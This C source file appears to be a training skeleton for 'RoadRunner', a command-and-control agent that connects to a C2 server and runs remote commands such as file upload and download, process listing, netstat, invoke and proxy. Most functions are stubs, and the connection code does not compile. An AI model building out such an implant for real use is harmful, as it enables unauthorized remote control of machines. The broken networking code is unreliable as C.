/**
 * roadrunner.c contains the main function of the program.
 * @file roadrunner.c
 */
// include what we need for the functionality
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
// include our own libraries here
#include <roadrunner.h>
#include <core.h>
#include <helloworld.h>
#include <utils.h>
#include <files.h>
#include <sys.h>
#include <proxy.h>

// declare our functions, these are static so they are not exported
static bool send_response(int sock_fd, Response *rsp);
static int connect_to_server();
static bool perform_command(Command *cmd, Response **rsp);
static Command *receive_command(int sock_fd);

/**
 * The main function for the RoadRunner Agent.
 * @return an integer return code (0 = good, 1 = bad)
 */
int main() 
{
    // call our hello world function
    say_hello();

    // Agent logic
        // connect
        connect_to_server();
        // Send checkin
        
	// begin main execution loop
        	// receive_command (see Networking section below)
        	// perform_command
        	// send_response
		// repeat until shutdown command is received

    return 0;
}

/******************************* AGENT CODE ***********************************/

/**
 * Perform a command sent by the server and send back a response.
 * @param cmd (in) a pointer to the command structure
 * @param rsp_out (out) a Response pointer that returns the command response
 * @return a bool indicating if the agent needs to shutdown (true = continue, false = shutdown)
 */
static bool perform_command(Command *cmd, Response **rsp_out)
{
    
    // perform an "if else" tree checking the command against all known command strings
    // receiving a valid command should result in calling the appropriate command function
    // if the shutdown command is received, an appropriate response should be returned to 
    // the server, then the client should exit

    /* Check if recieved command parameter are valid
    char* cmd;
    uint32_t cmd_len;
    char* args;
    uint32_t  args_len;

    is the total length of the message an unsigned int32?
    is cmd_len an unsigned int32?
    is the length of the args string an unsigned int32?  
    
    cmd->cmd_len
    Input validation for pointers, do I have a Null pointer?
        NULL != cmd, null != rsp_out

    */

    RR_DEBUG_PRINT("received: shutdown command\n")
    RR_DEBUG_PRINT("received: sleep command\n")
    RR_DEBUG_PRINT("received: download command\n")
    RR_DEBUG_PRINT("received: upload command\n")
    RR_DEBUG_PRINT("received: hostname command\n")
    RR_DEBUG_PRINT("received: process list command\n")
    RR_DEBUG_PRINT("received: netstat command\n")
    RR_DEBUG_PRINT("received: invoke command\n")
    RR_DEBUG_PRINT("received: proxy command\n")

    return 1;
}


/****************************** NETWORK CODE **********************************/

/**
 * Send the response to the server. 
 * @param sock_fd (in) a valid socket file descriptor
 * @param rsp (in) the response to be sent
 * @return a bool representing if the transmission had an error
 */
static bool send_response(int sock_fd, Response *rsp)
{
    // Serialize Response struct into byte stream (see commands.c in the command_io directory)
    // Send response byte stream to server
    return false;
}

/**
 * Receive a command from the C2 server.
 * @param sock_fd a valid socket file descriptor
 * @return a pointer to a Command structure
 */
static Command *receive_command(int sock_fd)
{
    Command *cmd = NULL;
    // Read from socket
    // convert from network to host byte order
    // Validate message
    // deserialize the command received from the server and populate a Command struct
    return cmd;
}


/**
 * Connect to a C2 server.
 * @return a socket file descriptor
 */
static int connect_to_server()
{
    int sock_fd = 0;
    int sock_fd = socket(AF_INET, SOCK_STREAM, 0)
    // setup the address to HOST/PORT defined in roadrunner.h
    server_addr = HOST;
    server_port = PORT;

    // connect
    connect(sock_fd, sockaddr *addr, socklen_t addrlen);
    
    addr: pointer to struct sockaddr containing the servers IP address
    and port number.
    addrlen: size of the addr.


    return sock_fd;
}
